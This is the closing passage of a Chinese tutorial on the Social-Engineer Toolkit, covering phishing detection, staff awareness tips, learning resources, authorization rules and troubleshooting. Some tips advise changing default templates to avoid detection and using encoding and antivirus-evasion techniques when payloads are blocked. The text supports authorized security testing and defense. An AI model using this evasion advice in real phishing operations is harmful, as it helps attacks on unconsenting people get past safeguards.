- 爬取可疑网站，与真实网站对比

**（3）威胁情报**
- 订阅威胁情报服务，及时获取新出现的钓鱼网站信息
- 参与行业信息共享组织

#### 6.1.2 钓鱼邮件检测

**（1）技术检测**
- SPF/DKIM/DMARC验证
- 邮件网关的反钓鱼引擎
- 可疑链接检测和沙箱分析
- 附件恶意代码检测

**（2）行为检测**
- 异常发件人行为检测
- 异常收件人群组检测
- 可疑付款指令检测（针对BEC）

**（3）用户报告**
- 建立便捷的举报机制
- 鼓励用户报告可疑邮件
- 对举报进行分析和响应

#### 6.1.3 SET特征检测

SET生成的钓鱼页面和邮件有一些特征，可以用来检测：

**钓鱼页面特征：**
- 特定的HTML结构和JavaScript代码模式
- 特定的URL路径和参数格式
- 特定的HTTP头信息
- 特定的服务器指纹

**钓鱼邮件特征：**
- SET默认的邮件格式和措辞
- SET生成的链接格式
- 特定的邮件头信息

注意：高级攻击者会修改这些默认特征，因此不能完全依赖特征检测。

### 6.2 钓鱼邮件识别技巧

#### 6.2.1 教员工识别钓鱼邮件

**识别要点：**

**（1）检查发件人**
- 发件人邮箱地址是否正确？
- 域名是否有拼写错误？
- 是内部邮箱还是外部邮箱？

**（2）检查内容**
- 是否有明显的语法或拼写错误？
- 语气是否异常（过于紧急、过于威胁）？
- 是否要求提供敏感信息（密码、银行卡号等）？
- 链接的真实地址是什么？（鼠标悬停查看）

**（3）检查附件**
- 是否在预期之内？
- 文件类型是否可疑（.exe、.js、.docm等）？
- 文件名是否有诱惑力（如"工资单"、"机密"）？

**（4）三思而后行**
- 不确定时，通过其他渠道（电话、当面）确认
- 不要直接回复邮件询问（可能会被攻击者继续欺骗）
- 向IT安全部门报告

#### 6.2.2 常见钓鱼邮件类型识别

| 类型 | 典型特征 | 识别要点 |
|------|---------|---------|
| **账号验证类** | 声称账号异常，要求点击链接验证 | 真正的服务商不会通过邮件索要密码 |
| **付款通知类** | 声称有付款需要处理，提供附件或链接 | 财务人员特别警惕，通过电话确认 |
| **快递通知类** | 声称有快递，要求点击链接 | 不要点击短信中的陌生链接 |
| **中奖/福利类** | 声称中奖或有福利，要求提供信息 | 天上不会掉馅饼 |
| **情色诱惑类** | 声称有不雅视频，要求付款 | 直接删除，不要理会 |
| **内部通知类** | 伪装成公司内部通知 | 检查发件人，验证信息真伪 |

---

## 第7章 学习资源与注意事项

### 7.1 学习资源

#### 7.1.1 官方资源

**（1）SET官方GitHub**
- 地址：https://github.com/trustedsec/social-engineer-toolkit
- 内容：最新源码、更新日志、问题反馈

**（2）TrustedSec官网**
- 地址：https://www.trustedsec.com/
- 内容：SET相关博客、白皮书、培训信息

**（3）SET文档**
- 地址：https://github.com/trustedsec/social-engineer-toolkit/wiki
- 内容：使用手册、FAQ、教程

#### 7.1.2 书籍推荐

**（1）《社会工程学：攻击与防范艺术》**
- 作者：Christopher Hadnagy
- SET的创建者之一撰写的社工经典书籍

**（2）《Metasploit渗透测试指南》**
- 作者：David Kennedy等
- SET的作者也是Metasploit的核心开发者，这本书对理解SET的技术基础很有帮助

**（3）《黑帽子：邪恶黑客的秘密》**
- 虽然不是专门讲SET的，但包含很多社工攻击的实战技巧

#### 7.1.3 在线教程

**（1）YouTube - TrustedSec频道**
- SET的官方视频教程
- 各种SET使用技巧演示

**（2）各类CTF平台**
- 很多CTF比赛中有社工相关的题目
- 通过解题练习社工技能

### 7.2 注意事项与最佳实践

#### 7.2.1 安全操作注意事项

**（1）始终获得授权**
- 任何社工测试都必须获得书面授权
- 明确测试范围和时间
- 保留授权文件备查

**（2）控制攻击范围**
- 只针对授权范围内的目标
- 避免影响无关人员
- 如果不小心超出范围，及时报告

**（3）保护目标隐私**
- 收集到的个人信息要妥善保管
- 测试结束后及时删除
- 不要泄露测试中的个人隐私

**（4）最小伤害原则**
- 攻击强度要适度
- 不要给目标造成不必要的心理压力
- 测试结束后及时告知并安抚

#### 7.2.2 SET使用最佳实践

**（1）保持更新**
- 定期更新SET到最新版本
- SET更新频繁，新版本会修复bug并增加新功能

```bash
# 在SET中更新
选择 "4) Update the Social-Engineer Toolkit"

# 或手动更新
cd /path/to/set
git pull
```

**（2）自定义配置**
- 根据实际需求修改配置文件
- 不要使用默认的设置和模板，容易被检测

**（3）结合其他工具**
- SET不是万能的，要结合其他工具使用
- 如：Gophish（更专业的钓鱼平台）、BeEF（浏览器攻击框架）、Empire（PowerShell后渗透框架）等

**（4）持续学习**
- 社工攻击技术发展很快
- 关注新的攻击手法和防御技术
- 参加安全会议和社区讨论

#### 7.2.3 常见问题排查

**（1）SET启动失败**
- 检查Python版本是否正确（需要Python 3.x）
- 检查依赖是否安装完整
- 查看错误日志，定位具体问题

**（2）网站克隆失败**
- 检查网络连接是否正常
- 目标网站是否有反爬机制
- 尝试使用代理或调整超时设置

**（3）邮件发送失败**
- 检查SMTP服务器配置
- 检查邮箱账号和密码是否正确
- 检查是否被防火墙拦截
- 查看邮件是否进入了垃圾邮件文件夹

**（4）Payload无法执行**
- 检查目标系统架构（32位/64位）
- 检查杀毒软件是否拦截
- 尝试使用不同的Payload类型
- 使用编码和免杀技术

---

## 总结

Social-Engineer Toolkit（SET）是一款功能强大的社工攻击工具包，它将复杂的社工攻击技术封装成简单易用的模块化工具，大大降低了社工攻击的技术门槛。

本文从SET的基础概念和安装配置入手，详细介绍了网站钓鱼、邮件钓鱼、恶意文件生成、传染性媒体等核心模块的使用方法，并通过实战案例演示了快速部署流程。此外，还介绍了绕过WAF、域名配置、Metasploit联动等高级技巧，以及防御检测的方法。

需要强调的是，SET只是一个工具，它本身并无善恶之分。关键在于使用它的人——是用它来帮助企业发现安全漏洞、提升防御能力，还是用它来进行违法犯罪活动。作为安全从业者，我们必须坚守法律和伦理底线，善用我们的技术能力。

> **免责声明**：本文档仅用于授权范围内的安全研究和渗透测试目的。任何使用本文档所述技术进行非法活动的行为，均与作者无关。请遵守当地法律法规，合法合规地开展安全工作。
